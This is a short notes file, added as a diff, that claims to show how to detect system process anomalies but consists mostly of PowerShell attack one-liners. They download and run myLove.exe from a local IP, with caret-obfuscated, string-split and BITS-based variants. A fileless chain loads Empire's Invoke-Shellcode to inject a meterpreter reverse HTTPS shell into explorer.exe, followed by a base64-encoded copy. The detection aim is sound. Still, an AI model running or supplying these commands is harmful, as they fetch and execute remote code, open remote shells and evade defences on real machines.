@@ -1,0 +1,44 @@
+
+To show hot to detect system process anomlies
+
+t detect the process that is trying to act as a system process
+
+resource jose.rsc
+
+calc.exe
+rename it to svchost
+
+
+
+
+Download a file and start it as a process
+
+Normal Example:
+powershell.exe -ExecutionPolicy bypass –noprofile –c (New-Object System.Net.WebClient).DownloadFile('http://172.16.60.124/myLove.exe', \"$env:temp\myLove.exe\"); Start-Process \"$env:temp\myLove.exe\"
+
+Obfuscated examples:
+1) powershell.exe -ExecutionPolicy bypass –noprofile –c (^New-Obj^ec^t Sy^s^tem.Net.WebClient).DoWnLOaDf^Ile('http://172.16.60.124/myLove.exe', \"$env:temp\myLove.exe\"); Start-Process \"$env:temp\myLove.exe\"
+
+2) powershell.exe -ExecutionPolicy bypass –noprofile –c (New-Object Net.WebClient).('Dow' + 'nloa' +'dfile').invoke('http://172.16.60.124/myLove.exe', \"$env:temp\myLove.exe\"); Start-Process \"$env:temp\myLove.exe\"
+
+
+
+Download a file and start it as a process using BITSTransfer (another powershell library to doewnload a file)
+
+powershell.exe -ExecutionPolicy bypass –noprofile –c "Import-Module BitsTransfer";Start-BitsTransfer -Source 'http://172.16.60.124/myLove.exe' -Destination \"$env:temp\myLove.exe\"; Invoke-Item \"$env:temp\myLove.exe\"
+
+
+
+
+Totally fileless example (with windows7 x64 bit)
+
+
+powershell.exe -c $cmd = (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellEmpire/Empire/master/data/module_source/code_execution/Invoke-Shellcode.ps1');Invoke-Expression -Command $cmd; Invoke-Shellcode -ProcessID (Get-Process -Name explorer).Id -Payload windows/meterpreter/reverse_https -Lhost 172.16.60.124 -lport 443 -Force
+
+
+powershell.exe -ExecuTionPolicy ByPass ^-^e^Nco^De JABtAHkAdgBhAHIAIAA9ACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAIgBoAHQAdABwAHMAOgAvAC8AcgBhAHcALgBnAGkAdABoAHUAYgB1AHMAZQByAGMAbwBuAHQAZQBuAHQALgBjAG8AbQAvAFAAbwB3AGUAcgBTAGgAZQBsAGwARQBtAHAAaQByAGUALwBFAG0AcABpAHIAZQAvAG0AYQBzAHQAZQByAC8AZABhAHQAYQAvAG0AbwBkAHUAbABlAF8AcwBvAHUAcgBjAGUALwBjAG8AZABlAF8AZQB4AGUAYwB1AHQAaQBvAG4ALwBJAG4AdgBvAGsAZQAtAFMAaABlAGwAbABjAG8AZABlAC4AcABzADEAIgApADsASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAALQBDAG8AbQBtAGEAbgBkACAAJABtAHkAdgBhAHIAOwAgAEkAbgB2AG8AawBlAC0AUwBoAGUAbABsAGMAbwBkAGUAIAAtAFAAcgBvAGMAZQBzAHMASQBEACAAKABHAGUAdAAtAFAAcgBvAGMAZQBzAHMAIAAtAE4AYQBtAGUAIABlAHgAcABsAG8AcgBlAHIAKQAuAEkAZAAgAC0AUABhAHkAbABvAGEAZAAgAHcAaQBuAGQAbwB3AHMALwBtAGUAdABlAHIAcAByAGUAdABlAHIALwByAGUAdgBlAHIAcwBlAF8AaAB0AHQAcABzACAALQBMAGgAbwBzAHQAIAAxADcAMgAuADEANgAuADYAMAAuADEAMgA0ACAALQBsAHAAbwByAHQAIAA0ADQAMwAgAC0ARgBvAHIAYwBlAA==
+
+
+
+
+saved search for a long commands
